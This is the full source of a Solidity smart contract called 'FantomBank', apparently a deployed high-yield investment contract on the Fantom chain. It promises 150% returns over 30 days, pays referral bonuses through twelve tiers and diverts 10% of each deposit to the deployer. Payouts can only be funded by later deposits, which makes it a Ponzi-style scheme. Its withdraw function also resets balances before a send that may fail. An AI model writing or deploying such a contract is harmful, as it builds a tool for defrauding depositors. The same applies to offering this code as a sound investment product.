/**
 *Submitted for verification at FtmScan.com on 2021-11-23
*/

pragma solidity ^0.4.25;

contract FantomBank {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  struct ReferralStats {
      uint tier1;
      uint tier2;
      uint tier3;
      uint tier4;
      uint tier5;
      uint tierNext;
  }
  
  uint MIN_DEPOSIT = 10 ether;
  uint START_TIME = 1637776800;
  
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  mapping (address => ReferralStats) public referrals;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
              referrals[rec].tier1++;
          } else if (i == 1) {
              referrals[rec].tier2++;
          } else if (i == 2) {
              referrals[rec].tier3++;
          } else if (i == 3) {
              referrals[rec].tier4++;
          } else if (i == 4) {
              referrals[rec].tier5++;
          } else {
              referrals[rec].tierNext++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 1000;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  constructor() public {
    tariffs.push(Tariff(30 * 86400, 150));
    
    refRewards.push(300);
    refRewards.push(100);
    refRewards.push(50);
    refRewards.push(20);
    refRewards.push(10);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
  }
  
  function deposit(uint tariff, address referer) external payable {
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    require(investors[msg.sender].deposits.length < 200);
    require(now >= START_TIME);
    
    register(referer);
    support.transfer(msg.value / 10);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, now));
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = now > finish ? finish : now;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint, uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amountWithoutRef = withdrawable(msg.sender);
    uint amount = amountWithoutRef + investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = now;
    
    return (amount, amountWithoutRef);
  }
  
  function withdraw() external {
    (uint amount, uint amountWithoutRef) = profit();
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;
      rewardReferers(amountWithoutRef, investors[msg.sender].referer);
      
      emit Withdraw(msg.sender, amount);
    }
  }
}